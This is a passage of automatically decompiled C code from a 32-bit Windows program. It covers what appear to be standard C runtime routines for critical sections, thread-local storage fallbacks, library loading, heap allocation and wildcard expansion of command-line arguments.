                    goto lab_0x40beb8;
                }
                case 0: {
                    goto lab_0x40beb8;
                }
                default: {
                    int32_t v17 = v15 - 4; // 0x40be8b
                    *(int32_t *)v17 = v16;
                    int32_t v18 = GetFileType(&g266); // 0x40be8c
                    if (v18 == 0) {
                        goto lab_0x40beb8;
                    } else {
                        int32_t v19 = v18 & 255; // 0x40be9a
                        *v6 = v16;
                        if (v19 != 2) {
                            // 0x40bead
                            result = v19;
                            v2 = v17;
                            if (v19 == 3) {
                                // 0x40beb2
                                *v7 = *v7 | 8;
                                result = v19;
                                v2 = v17;
                            }
                        } else {
                            // 0x40bea7
                            *v7 = *v7 | 64;
                            result = v19;
                            v2 = v17;
                        }
                        goto lab_0x40bed6;
                    }
                }
            }
        } else {
            // 0x40be55
            *v7 = *v7 | -128;
            result = v4;
            v2 = v8;
            goto lab_0x40bed6;
        }
    }
  lab_0x40bee0:
    // 0x40bee0
    return result;
  lab_0x40beb8:;
    int32_t v20 = v5;
    *v7 = *v7 | 64;
    *v6 = -2;
    result = 0;
    v2 = v20;
    if (g203 != 0) {
        int32_t v21 = *(int32_t *)(g203 + 4 * v4); // 0x40becc
        *(int32_t *)(v21 + 16) = -2;
        result = v21;
        v2 = v20;
    }
    goto lab_0x40bed6;
  lab_0x40bed6:
    // 0x40bed6
    v3 = v4 + 1;
    if (v3 == 3) {
        // break -> 0x40bee0
        goto lab_0x40bee0;
    }
    goto lab_0x40be35;
}

// Address range: 0x40bee4 - 0x40bf2e
int32_t function_40bee4(void) {
    // 0x40bee4
    function_406770(&g99, 12, (int32_t)&g266);
    function_40bfa7(7);
    int32_t v1; // 0x40bee4
    char * v2 = (char *)(v1 - 25); // 0x40befa
    *v2 = 0;
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40befd
    *v3 = 0;
    if (function_40d85d(0) == 0) {
        // 0x40bf0b
        function_40bd78();
        function_40be2e();
        *v2 = 1;
    }
    // 0x40bf1a
    *v3 = -2;
    function_40bf31();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40bf28
    return result;
}

// Address range: 0x40bf31 - 0x40bf3a
int32_t function_40bf31(void) {
    // 0x40bf31
    return function_40bfef(7);
}

// Address range: 0x40bf3c - 0x40bf66
int32_t function_40bf3c(void) {
    int32_t result; // 0x40bf3c
    for (int32_t i = 0; i < 512; i += 4) {
        int32_t * v1 = (int32_t *)(i + (int32_t)&g207); // 0x40bf3f
        int32_t v2 = *v1; // 0x40bf3f
        result = 1;
        if (v2 != 0) {
            // 0x40bf49
            int32_t v3; // bp-4, 0x40bf3c
            *(int32_t *)((int32_t)&v3 - 4) = v2;
            int32_t v4 = function_40d828((int32_t)&g266); // 0x40bf4a
            *v1 = 0;
            result = v4 & -256 | 1;
        }
    }
    // 0x40bf62
    return result;
}

// Address range: 0x40bf68 - 0x40bfa7
int32_t function_40bf68(void) {
    int32_t v1 = 0; // 0x40bf6f
    int32_t v2 = (int32_t)&g210; // 0x40bf6f
    int32_t v3; // bp-8, 0x40bf68
    int32_t v4 = &v3;
    *(int32_t *)(v4 - 4) = 0;
    *(int32_t *)(v4 - 8) = 4000;
    int32_t v5 = v4 - 12; // 0x40bf78
    *(int32_t *)v5 = v2;
    int32_t v6 = function_40c278((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40bf79
    int32_t result; // 0x40bf68
    while (v6 != 0) {
        // 0x40bf82
        g211 = (int32_t)g211 + 1;
        v1 += 24;
        v2 += 24;
        if (v1 >= 312) {
            // 0x40bf96
            result = v6 & -256 | 1;
            return result;
        }
        v4 = v5;
        *(int32_t *)(v4 - 4) = 0;
        *(int32_t *)(v4 - 8) = 4000;
        v5 = v4 - 12;
        *(int32_t *)v5 = v2;
        v6 = function_40c278((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    }
    // 0x40bf9a
    *(int32_t *)(v4 - 16) = 0;
    result = function_40bfbe() & -256;
  lab_0x40bfa4:
    // 0x40bfa4
    return result;
}

// Address range: 0x40bfa7 - 0x40bfbe
int32_t function_40bfa7(int32_t a1) {
    // 0x40bfa7
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)(24 * a1 + (int32_t)&g210));
    return &g266;
}

// Address range: 0x40bfbe - 0x40bfef
int32_t function_40bfbe(void) {
    int32_t v1 = g211; // 0x40bfc1
    if (v1 == 0) {
        // 0x40bfeb
        int32_t v2; // 0x40bfbe
        return v2 & -256 | 1;
    }
    // 0x40bfcb
    int32_t v3; // bp-8, 0x40bfbe
    int32_t v4 = &v3; // 0x40bfcf
    int32_t v5 = v1; // 0x40bfcf
    int32_t v6 = 24 * v1 + (int32_t)&g208; // 0x40bfcf
    v4 -= 4;
    *(int32_t *)v4 = v6;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    g211 = (int32_t)g211 - 1;
    v5--;
    v6 -= 24;
    while (v5 != 0) {
        // 0x40bfd5
        v4 -= 4;
        *(int32_t *)v4 = v6;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
        g211 = (int32_t)g211 - 1;
        v5--;
        v6 -= 24;
    }
    // 0x40bfeb
    return (int32_t)&g266 & -256 | 1;
}

// Address range: 0x40bfef - 0x40c006
int32_t function_40bfef(int32_t a1) {
    // 0x40bfef
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)(24 * a1 + (int32_t)&g210));
    return &g266;
}

// Address range: 0x40c006 - 0x40c0a2
int32_t function_40c006(int32_t a1, char * a2, int32_t * a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t * v1 = (int32_t *)(4 * a1 + (int32_t)&g213); // 0x40c018
    uint32_t v2 = g112 & 31; // 0x40c027
    int32_t v3 = g112 ^ *v1; // 0x40c02a
    int32_t result2 = v3; // 0x40c02c
    if (v2 != 0) {
        result2 = v3 << 32 - v2 | v3 >> v2;
    }
    int32_t v4; // 0x40c006
    int32_t v5; // 0x40c006
    switch (result2) {
        case -1: {
            // 0x40c09d
            return 0;
        }
        case 0: {
            // 0x40c03a
            int32_t v6; // bp-16, 0x40c006
            int32_t v7 = &v6; // 0x40c010
            v4 = g112;
            v5 = v7;
            if (a3 != a4) {
                int32_t * v8 = (int32_t *)(v7 - 4);
                int32_t v9 = (int32_t)a3; // 0x40c04e
                *v8 = *(int32_t *)v9;
                int32_t v10 = function_40c0a2((int32_t)&g266); // 0x40c044
                while (v10 == 0) {
                    // 0x40c04e
                    v9 += 4;
                    if (v9 == (int32_t)a4) {
                        // 0x40c056
                        v4 = g112;
                        v5 = v7;
                        goto lab_0x40c08b;
                    }
                    *v8 = *(int32_t *)v9;
                    v10 = function_40c0a2((int32_t)&g266);
                }
                // 0x40c062
                *v8 = (int32_t)a2;
                int32_t v11 = v7 - 8; // 0x40c065
                *(int32_t *)v11 = v10;
                int32_t (*func)() = GetProcAddress(&g266, (char *)&g266); // 0x40c066
                if (func != NULL) {
                    int32_t result = (int32_t)func; // 0x40c066
                    *(int32_t *)(v7 - 12) = result;
                    *v1 = function_405b90((int32_t)&g266);
                    // 0x40c09d
                    return result;
                }
                // 0x40c085
                v4 = g112;
                v5 = v11;
            }
            // break -> 0x40c08b
            break;
        }
        default: {
            // 0x40c09d
            return result2;
        }
    }
    goto lab_0x40c08b;
  lab_0x40c08b:
    // 0x40c08b
    *(int32_t *)(v5 - 4) = 32;
    uint32_t v12 = -v4 & 31; // 0x40c095
    int32_t v13 = -1; // 0x40c095
    if (v12 != 0) {
        v13 = -1 << 32 - v12 | 0xffffffff >> v12;
    }
    *v1 = v13 ^ v4;
    // 0x40c09d
    return 0;
}

// Address range: 0x40c0a2 - 0x40c11d
int32_t function_40c0a2(int32_t a1) {
    int32_t v1 = 4 * a1; // 0x40c0ab
    int32_t * v2 = (int32_t *)(v1 + (int32_t)&g212); // 0x40c0b2
    int32_t v3 = *v2; // 0x40c0b2
    if (v3 != 0) {
        // 0x40c11a
        return v3 == -1 ? 0 : v3;
    }
    int16_t * lpLibFileName = (int16_t *)*(int32_t *)(v1 + (int32_t)&g37); // 0x40c0d3
    int16_t * v4 = lpLibFileName; // bp-28, 0x40c0d3
    int32_t * hFile = LoadLibraryExW(lpLibFileName, NULL, 2048); // 0x40c0d4
    int32_t dwFlags = (int32_t)hFile; // 0x40c0d4
    int16_t ** v5 = &v4; // 0x40c0de
    int32_t result = dwFlags; // 0x40c0de
    if (hFile == NULL) {
        // 0x40c0e0
        if (GetLastError() != 87) {
            // 0x40c0fe
            *v2 = -1;
            // 0x40c11a
            return 0;
        }
        int16_t * v6 = lpLibFileName; // bp-40, 0x40c0ed
        int32_t * v7 = LoadLibraryExW(lpLibFileName, hFile, dwFlags); // 0x40c0ee
        v5 = &v6;
        result = (int32_t)v7;
        if (v7 == NULL) {
            // 0x40c0fe
            *v2 = -1;
            // 0x40c11a
            return 0;
        }
    }
    // 0x40c107
    *v2 = result;
    if (*v2 != 0) {
        // 0x40c10f
        *(int32_t *)((int32_t)v5 - 4) = result;
        FreeLibrary(&g266);
    }
    // 0x40c11a
    return result;
}

// Address range: 0x40c11d - 0x40c173
int32_t function_40c11d(int32_t a1) {
    // 0x40c11d
    int32_t v1; // bp-4, 0x40c11d
    int32_t v2; // 0x40c11d
    int32_t v3; // 0x40c11d
    int32_t v4 = function_40c006(3, "FlsAlloc", &g38, &g39, v2, g112 ^ (int32_t)&v1, v3); // 0x40c13f
    if (v4 == 0) {
        // 0x40c15c
        TlsAlloc();
    } else {
        // 0x40c14d
        function_4065bf();
    }
    // 0x40c162
    return function_4065ae();
}

// Address range: 0x40c173 - 0x40c1c9
int32_t function_40c173(int32_t dwTlsIndex) {
    // 0x40c173
    int32_t v1; // bp-4, 0x40c173
    int32_t v2; // 0x40c173
    int32_t v3; // 0x40c173
    int32_t v4 = function_40c006(4, "FlsFree", &g39, &g40, v2, g112 ^ (int32_t)&v1, v3); // 0x40c195
    if (v4 == 0) {
        // 0x40c1b2
        TlsFree(dwTlsIndex);
    } else {
        // 0x40c1a6
        function_4065bf();
    }
    // 0x40c1b8
    return function_4065ae();
}

// Address range: 0x40c1c9 - 0x40c21f
int32_t function_40c1c9(int32_t dwTlsIndex) {
    // 0x40c1c9
    int32_t v1; // bp-4, 0x40c1c9
    int32_t v2; // 0x40c1c9
    int32_t v3; // 0x40c1c9
    int32_t v4 = function_40c006(5, "FlsGetValue", &g40, &g41, v2, g112 ^ (int32_t)&v1, v3); // 0x40c1eb
    if (v4 == 0) {
        // 0x40c208
        TlsGetValue(dwTlsIndex);
    } else {
        // 0x40c1fc
        function_4065bf();
    }
    // 0x40c20e
    return function_4065ae();
}

// Address range: 0x40c21f - 0x40c278
int32_t function_40c21f(int32_t dwTlsIndex, int32_t lpTlsValue) {
    // 0x40c21f
    int32_t v1; // bp-4, 0x40c21f
    int32_t v2; // 0x40c21f
    int32_t v3; // 0x40c21f
    int32_t v4 = function_40c006(6, "FlsSetValue", &g41, &g42, v2, g112 ^ (int32_t)&v1, v3); // 0x40c241
    if (v4 == 0) {
        // 0x40c261
        TlsSetValue(dwTlsIndex, (int32_t *)lpTlsValue);
    } else {
        // 0x40c255
        function_4065bf();
    }
    // 0x40c267
    return function_4065ae();
}

// Address range: 0x40c278 - 0x40c2da
int32_t function_40c278(int32_t lpCriticalSection, int32_t dwSpinCount, int32_t a3) {
    // 0x40c278
    int32_t v1; // bp-4, 0x40c278
    int32_t v2; // 0x40c278
    int32_t v3; // 0x40c278
    int32_t v4 = function_40c006(20, "InitializeCriticalSectionEx", (int32_t *)&g43, &g44, v2, g112 ^ (int32_t)&v1, v3); // 0x40c29a
    if (v4 == 0) {
        // 0x40c2bd
        InitializeCriticalSectionAndSpinCount((struct _RTL_CRITICAL_SECTION *)lpCriticalSection, dwSpinCount);
    } else {
        // 0x40c2a8
        function_4065bf();
    }
    // 0x40c2c9
    return function_4065ae();
}

// Address range: 0x40c2da - 0x40c362
int32_t function_40c2da(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    // 0x40c2da
    int32_t v1; // bp-4, 0x40c2da
    int32_t v2; // 0x40c2da
    int32_t v3; // 0x40c2da
    int32_t v4 = function_40c006(22, "LCMapStringEx", &g44, (int32_t *)"LCMapStringEx", v2, g112 ^ (int32_t)&v1, v3); // 0x40c2fc
    if (v4 == 0) {
        int32_t Locale = function_40c362(a1, 0, a2, a3, a4, a5, a6); // 0x40c345
        LCMapStringW(Locale, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266);
    } else {
        // 0x40c30a
        function_4065bf();
    }
    // 0x40c351
    return function_4065ae();
}

// Address range: 0x40c362 - 0x40c3be
int32_t function_40c362(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    // 0x40c362
    int32_t v1; // bp-4, 0x40c362
    int32_t v2; // 0x40c362
    int32_t v3; // 0x40c362
    int32_t v4 = function_40c006(24, "LocaleNameToLCID", &g45, (int32_t *)"LocaleNameToLCID", v2, g112 ^ (int32_t)&v1, v3); // 0x40c384
    if (v4 == 0) {
        // 0x40c3a4
        function_40ec6f(a1);
    } else {
        // 0x40c392
        function_4065bf();
    }
    // 0x40c3ad
    return function_4065ae();
}

// Address range: 0x40c3be - 0x40c3e4
int32_t function_40c3be(void) {
    // 0x40c3be
    __asm_rep_stosd_memset((char *)&g213, g112, 32);
    return g112 & -256 | 1;
}

// Address range: 0x40c3e4 - 0x40c46b
int32_t function_40c3e4(int32_t a1) {
    // 0x40c3e4
    if (g214 != 0) {
        // 0x40c45d
        return function_4065ae();
    }
    int32_t v1 = &g42; // bp-24, 0x40c40f
    int32_t v2; // bp-4, 0x40c3e4
    int32_t v3; // 0x40c3e4
    int32_t v4; // 0x40c3e4
    int32_t v5 = function_40c006(8, "GetCurrentPackageId", &g42, (int32_t *)"GetCurrentPackageId", v3, v4, g112 ^ (int32_t)&v2); // 0x40c41b
    int32_t v6; // bp-16, 0x40c3e4
    int32_t * v7 = &v6; // 0x40c427
    if (v5 != 0) {
        int32_t v8 = 0; // bp-12, 0x40c429
        v1 = &v8;
        int32_t v9 = function_4065bf(); // 0x40c435
        v7 = &v1;
        if (v9 == 122) {
            // 0x40c45c
            g214 = 1;
            // 0x40c45d
            return function_4065ae();
        }
    }
    // 0x40c450
    *(int32_t *)((int32_t)v7 - 4) = 2;
    // 0x40c45c
    g214 = 2;
    // 0x40c45d
    return function_4065ae();
}

// Address range: 0x40c46d - 0x40c4a1
int32_t function_40c46d(char a1) {
    int32_t v1; // 0x40c46d
    if (a1 != 0) {
        // 0x40c49d
        return v1 & -256 | 1;
    }
    // 0x40c476
    int32_t v2; // bp-8, 0x40c46d
    int32_t v3 = &v2; // 0x40c477
    int32_t v4 = &g212; // 0x40c477
    int32_t v5; // 0x40c46d
    int32_t v6; // 0x40c46d
    int32_t v7; // 0x40c46d
    int32_t * v8; // 0x40c47c
    int32_t v9; // 0x40c486
    while (true) {
      lab_0x40c47c:;
        int32_t v10 = v3;
        v8 = (int32_t *)v4;
        int32_t v11 = *v8; // 0x40c47c
        v9 = v10;
        v6 = v5;
        v3 = v10;
        v7 = v5;
        switch (v11) {
            case 0: {
                goto lab_0x40c491;
            }
            case -1: {
                goto lab_0x40c48e;
            }
            default: {
                // 0x40c486
                v9 = v10 - 4;
                *(int32_t *)v9 = v11;
                v6 = FreeLibrary(&g266);
                goto lab_0x40c48e;
            }
        }
    }
    // 0x40c49d
    return v1 & -256 | 1;
  lab_0x40c491:
    // 0x40c491
    v4 += 4;
    v5 = v7;
    v1 = v7;
    if (v4 == (int32_t)&g213) {
        return v1 & -256 | 1;
    }
    goto lab_0x40c47c;
  lab_0x40c48e:
    // 0x40c48e
    *v8 = 0;
    v3 = v9;
    v7 = v6;
    goto lab_0x40c491;
}

// Address range: 0x40c4a1 - 0x40c4fe
int32_t function_40c4a1(uint32_t a1, uint32_t a2) {
    if (a1 != 0) {
        if (0xffffffe0 / a1 < a2) {
          lab_0x40c4ee_2:
            // 0x40c4ee
            *(int32_t *)function_40ab11() = 12;
            // 0x40c4fb
            return 0;
        }
    }
    int32_t v1 = a2 * a1; // 0x40c4ba
    int32_t v2 = v1 + (int32_t)(v1 == 0);
    int32_t v3; // bp-8, 0x40c4a1
    int32_t v4 = &v3;
    *(int32_t *)(v4 - 4) = v2;
    *(int32_t *)(v4 - 8) = 8;
    int32_t v5 = v4 - 12; // 0x40c4dc
    *(int32_t *)v5 = g227;
    int32_t * v6 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x40c4e2
    while (v6 == NULL) {
        // 0x40c4c5
        if (function_40a856() == 0) {
            goto lab_0x40c4ee_2;
        }
        // 0x40c4ce
        *(int32_t *)(v4 - 16) = v2;
        if (function_4096f2((int32_t)&g266) == 0) {
            goto lab_0x40c4ee_2;
        }
        v4 = v5;
        *(int32_t *)(v4 - 4) = v2;
        *(int32_t *)(v4 - 8) = 8;
        v5 = v4 - 12;
        *(int32_t *)v5 = g227;
        v6 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
    }
    // 0x40c4fb
    return (int32_t)v6;
}

// Address range: 0x40c500 - 0x40c516
int32_t function_40c500(uint32_t a1, uint32_t a2) {
    if (a2 > a1) {
        // 0x40c50b
        return -1;
    }
    // 0x40c510
    return (bool)(a2 < a1);
}

// Address range: 0x40c516 - 0x40c6a6
int32_t function_40c516(int32_t a1, int32_t a2) {
    if (a2 == 0) {
        // 0x40c526
        *(int32_t *)function_40ab11() = 22;
        // 0x40c694
        return 22;
    }
    // 0x40c53c
    int32_t v1; // bp-48, 0x40c516
    int32_t v2 = &v1; // 0x40c542
    int32_t * v3 = (int32_t *)a2; // 0x40c543
    *v3 = 0;
    int32_t v4 = 0; // bp-36, 0x40c549
    v4 = 0;
    int16_t v5; // bp-8, 0x40c516
    if (*(int32_t *)a1 != 0) {
        int32_t * v6 = (int32_t *)(v2 - 4); // 0x40c55f
        int32_t v7 = &v5; // 0x40c55f
        int32_t * v8 = (int32_t *)(v2 - 8); // 0x40c560
        int32_t * v9 = (int32_t *)(v2 - 12);
        int32_t v10 = a1; // 0x40c59d
        v5 = 0x3f2a;
        *v6 = v7;
        int32_t * v11 = (int32_t *)v10; // 0x40c560
        *v8 = *v11;
        int32_t v12 = function_40f1e0(0x3f2a, 0); // 0x40c565
        *v6 = (int32_t)&v4;
        int32_t v13; // 0x40c516
        int32_t v14; // 0x40c58b
        int32_t v15; // 0x40c57a
        if (v12 != 0) {
            // 0x40c584
            *v8 = v12;
            *v9 = *v11;
            v14 = function_40c73c((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            v13 = v14;
        } else {
            // 0x40c570
            *v8 = 0;
            *v9 = 0;
            *(int32_t *)(v2 - 16) = *v11;
            v15 = function_40c6a6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            v13 = v15;
        }
        int32_t result = v13; // 0x40c597
        while (v13 == 0) {
            // 0x40c59d
            v10 += 4;
            if (*(int32_t *)v10 == 0) {
                // 0x40c5a6
                goto lab_0x40c5ac;
            }
            v5 = 0x3f2a;
            *v6 = v7;
            v11 = (int32_t *)v10;
            *v8 = *v11;
            v12 = function_40f1e0(0x3f2a, 0);
            *v6 = (int32_t)&v4;
            if (v12 != 0) {
                // 0x40c584
                *v8 = v12;
                *v9 = *v11;
                v14 = function_40c73c((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                v13 = v14;
            } else {
                // 0x40c570
                *v8 = 0;
                *v9 = 0;
                *(int32_t *)(v2 - 16) = *v11;
                v15 = function_40c6a6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                v13 = v15;
            }
            // 0x40c593
            result = v13;
        }
        // 0x40c688
        function_40c8c0();
        // 0x40c694
        return result;
    }
    goto lab_0x40c5ac;
  lab_0x40c5ac:
    // 0x40c5ac
    v5 = 0;
    uint32_t v16 = 3 - v4; // 0x40c5b9
    int32_t v17 = 0; // 0x40c5ce
    int32_t v18 = 0; // 0x40c5ce
    int32_t v19 = 0; // 0x40c5ce
    if (v4 == 0 && v16 >= 4) {
        int32_t v20 = *(int32_t *)v17; // 0x40c5d4
        int16_t v21 = (int16_t)v20 + 1; // 0x40c5d9
        v5 = v21;
        int32_t v22 = v20;
        int32_t v23 = v22 + 1; // 0x40c5de
        while (*(char *)v22 != 0) {
            // 0x40c5dc
            v22 = v23;
            v23 = v22 + 1;
        }
        int32_t v24 = 1 + v23 - (int32_t)v21; // 0x40c5ea
        int32_t v25 = 1; // 0x40c5ef
        int32_t v26 = v25; // 0x40c5f5
        v17 += 4;
        int32_t v27 = v24; // 0x40c5f5
        while (v25 != v16 / 4) {
            // 0x40c5d4
            v20 = *(int32_t *)v17;
            v21 = (int16_t)v20 + 1;
            v5 = v21;
            v22 = v20;
            v23 = v22 + 1;
            while (*(char *)v22 != 0) {
                // 0x40c5dc
                v22 = v23;
                v23 = v22 + 1;
            }
            // 0x40c5e3
            v24 = v27 + 1 + v23 - (int32_t)v21;
            v25 = v26 + 1;
            v26 = v25;
            v17 += 4;
            v27 = v24;
        }
        // 0x40c5f7
        v5 = v24;
        v18 = 0x10000 * v24 / 0x10000;
        v19 = v25;
    }
    int32_t v28 = -v4 / 4 + 1; // 0x40c5bf
    int32_t * v29 = (int32_t *)(v2 - 4); // 0x40c600
    *v29 = 1;
    int32_t * v30 = (int32_t *)(v2 - 8); // 0x40c602
    *v30 = v18;
    int32_t * v31 = (int32_t *)(v2 - 12); // 0x40c605
    *v31 = v28;
    int32_t v32 = function_409e5f(v19, v18, (int32_t)&g266); // 0x40c606
    int32_t result2 = -1; // 0x40c612
    if (v32 != 0) {
        if (v4 != 0) {
            int32_t v33 = v32 + 4 * v28; // 0x40c61c
            int32_t * v34 = (int32_t *)(v2 - 16);
            int32_t v35 = v33; // 0x40c62f
            int32_t v36 = v4; // 0x40c62f
            int32_t * v37 = (int32_t *)v36; // 0x40c632
            int32_t v38 = *v37; // 0x40c632
            int32_t v39 = v38;
            int32_t v40 = v39 + 1; // 0x40c63f
            while (*(char *)v39 != 0) {
                // 0x40c63a
                v39 = v40;
                v40 = v39 + 1;
            }
            int32_t v41 = v39 - v38 + 1; // 0x40c644
            *v29 = v41;
            *v30 = *v37;
            *v31 = v33 - v35 + (int32_t)v5;
            *v34 = v35;
            while (function_40f1cb(v41) == 0) {
                // 0x40c663
                *(int32_t *)(v32 - v4 + v36) = v35;
                v36 += 4;
                v35 += v41;
                if (v36 == 0) {
                    goto lab_0x40c679;
                }
                v37 = (int32_t *)v36;
                v38 = *v37;
                v39 = v38;
                v40 = v39 + 1;
                while (*(char *)v39 != 0) {
                    // 0x40c63a
                    v39 = v40;
                    v40 = v39 + 1;
                }
                // 0x40c641
                v41 = v39 - v38 + 1;
                *v29 = v41;
                *v30 = *v37;
                *v31 = v33 - v35 + (int32_t)v5;
                *v34 = v35;
            }
            // 0x40c699
            *v29 = 0;
            *v30 = 0;
            *v31 = 0;
            *v34 = 0;
            *(int32_t *)(v2 - 20) = 0;
            function_4096a0();
            return __asm_int3();
        }
      lab_0x40c679:
        // 0x40c679
        *v3 = v32;
        result2 = 0;
    }
    // 0x40c680
    *v29 = 0;
    function_40bbdc((int32_t)&g266);
    // 0x40c688
    function_40c8c0();
    // 0x40c694
    return result2;
}

// Address range: 0x40c6a6 - 0x40c73c
int32_t function_40c6a6(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a1; // 0x40c6af
    while (*(char *)v1 != 0) {
        // 0x40c6b2
        v1++;
    }
    uint32_t v2 = v1 - a1 + 1; // 0x40c6c2
    if (v2 > (a3 ^ -1)) {
        // 0x40c72a
        return 12;
    }
    int32_t v3 = function_40c4a1(a3 + 1 + v2, 1); // 0x40c6db
    if (a3 != 0) {
        // 0x40c6e8
        if (function_40f1cb(v3) != 0) {
            // 0x40c72f
            function_4096a0();
            return __asm_int3();
        }
    }
    // 0x40c6fa
    if (function_40f1cb(v3 + a3) != 0) {
        // 0x40c72f
        function_4096a0();
        return __asm_int3();
    }
    int32_t result = function_40c8e5(v3); // 0x40c717
    function_40bbdc(0);
    // 0x40c72a
    return result;
}

// Address range: 0x40c73c - 0x40c8c0
int32_t function_40c73c(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40c73c
    int32_t v1; // bp-352, 0x40c73c
    int32_t v2 = &v1; // 0x40c75c
    int32_t v3 = a2; // 0x40c780
    if (a2 != a1) {
        int32_t v4 = a2; // 0x40c73c
        while (true) {
          lab_0x40c765:
            // 0x40c765
            v3 = v4;
            int32_t v5; // 0x40c73c
            switch (*(char *)v5) {
                case 47: {
                    goto lab_0x40c782;
                }
                case 92: {
                    goto lab_0x40c782;
                }
                case 58: {
                    goto lab_0x40c782;
                }
                default: {
                    // 0x40c773
                    *(int32_t *)(v2 - 4) = v4;
                    *(int32_t *)(v2 - 8) = a1;
                    int32_t v6 = function_40f220((int32_t)&g266, (int32_t)&g266); // 0x40c775
                    v4 = v6;
                    if (v6 == a1) {
                        // break -> 0x40c782
                        break;
                    }
                    goto lab_0x40c765;
                }
            }
        }
    }
  lab_0x40c782:;
    char v7 = *(char *)v3; // 0x40c782
    if (v3 != a1 + 1 && v7 == 58) {
        // 0x40c790
        *(int32_t *)(v2 - 4) = a3;
        *(int32_t *)(v2 - 8) = 0;
        *(int32_t *)(v2 - 12) = 0;
        *(int32_t *)(v2 - 16) = a1;
        function_40c6a6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        // 0x40c81a
        return function_4065ae();
    }
    int32_t * v8; // 0x40c73c
    int32_t v9; // 0x40c73c
    switch (v7) {
        case 47: {
        }
        case 92: {
            int32_t * v10 = (int32_t *)(v2 - 4); // 0x40c7c0
            *v10 = 320;
            v8 = v10;
            v9 = 1 - a1 + v3;
            // break ->
            break;
        }
        default: {
            int32_t * v11 = (int32_t *)(v2 - 4); // 0x40c7c0
            *v11 = 320;
            v8 = v11;
            v9 = v7 != 58 ? 0 : 1 - a1 + v3;
            // break ->
            break;
        }
    }
    int32_t * v12 = (int32_t *)(v2 - 8); // 0x40c7d5
    *v12 = 0;
    int32_t * v13 = (int32_t *)(v2 - 12); // 0x40c7d6
    int32_t v14; // bp-328, 0x40c73c
    int32_t v15 = &v14; // 0x40c7d6
    *v13 = v15;
    function_4071b0((int32_t *)v9, (int32_t)&g266, (int32_t)&g266);
    *v8 = 0;
    *v12 = 0;
    *v13 = 0;
    *(int32_t *)(v2 - 16) = v15;
    *(int32_t *)(v2 - 20) = 0;
    int32_t v16 = v2 - 24; // 0x40c7ea
    *(int32_t *)v16 = a1;
    int32_t * v17 = FindFirstFileExA((char *)&g266, (int32_t)&g266, &g266, (int32_t)&g266, &g266, (int32_t)&g266); // 0x40c7eb
    if (v17 == (int32_t *)-1) {
        // 0x40c80c
        *(int32_t *)(v2 - 28) = a3;
        *(int32_t *)(v2 - 32) = 0;
        *(int32_t *)(v2 - 36) = 0;
        *(int32_t *)(v2 - 40) = a1;
        function_40c6a6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        // 0x40c81a
        return function_4065ae();
    }
    int32_t v18 = (int32_t)v17; // 0x40c7eb
    int32_t * v19 = (int32_t *)(a3 + 4); // 0x40c82b
    int32_t * v20 = (int32_t *)a3; // 0x40c82e
    int32_t v21 = *v19 - *v20; // 0x40c82e
    int32_t v22 = v21 / 4; // 0x40c830
    int32_t v23 = v16; // 0x40c833
    int32_t v24; // 0x40c73c
    while (true) {
        int32_t v25 = v23;
        int32_t * v26 = (int32_t *)(v25 - 4);
        int32_t v27; // 0x40c73c
        int32_t * v28; // 0x40c73c
        char v29; // bp-284, 0x40c73c
        char v30; // 0x40c73c
        char v31; // 0x40c73c
        if ((v31 == 0 || v30 == 0 == v31 == 46) == v29 == 46) {
            int32_t v32 = v25 - 8; // 0x40c87c
            v28 = (int32_t *)v32;
            v27 = v32;
        } else {
            // 0x40c85a
            *v26 = a3;
            int32_t v33 = v25 - 8;
            int32_t * v34 = (int32_t *)v33;
            *v34 = v9;
            *(int32_t *)(v25 - 12) = a1;
            *(int32_t *)(v25 - 16) = (int32_t)&v29;
            int32_t v35 = function_40c6a6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40c869
            v24 = v25;
            v28 = v34;
            v27 = v33;
            if (v35 != 0) {
                // break -> 0x40c811
                break;
            }
        }
        int32_t v36 = v27;
        *v26 = v15;
        *v28 = v18;
        bool v37 = FindNextFileA(&g266, (struct _WIN32_FIND_DATAA *)&g266); // 0x40c87d
        v23 = v36;
        if (!v37) {
            int32_t v38 = *v20; // 0x40c88d
            int32_t v39 = (*v19 - v38) / 4; // 0x40c89a
            v24 = v36;
            if (v39 == v22) {
                goto lab_0x40c811;
            } else {
                // 0x40c8a5
                *(int32_t *)(v25 - 12) = 0x40c4fe;
                *(int32_t *)(v25 - 16) = 4;
                *(int32_t *)(v25 - 20) = v39 - v22;
                *(int32_t *)(v25 - 24) = v38 + (v21 & -4);
                function_40ed80((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                v24 = v36;
                goto lab_0x40c811;
            }
        }
    }
  lab_0x40c811:
    // 0x40c811
    *(int32_t *)(v24 - 4) = v18;
    FindClose(&g266);
    // 0x40c81a
    return function_4065ae();
}

// Address range: 0x40c8c0 - 0x40c8e5
int32_t function_40c8c0(void) {
    // 0x40c8c0
    int32_t v1; // 0x40c8c0
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x40c8d5
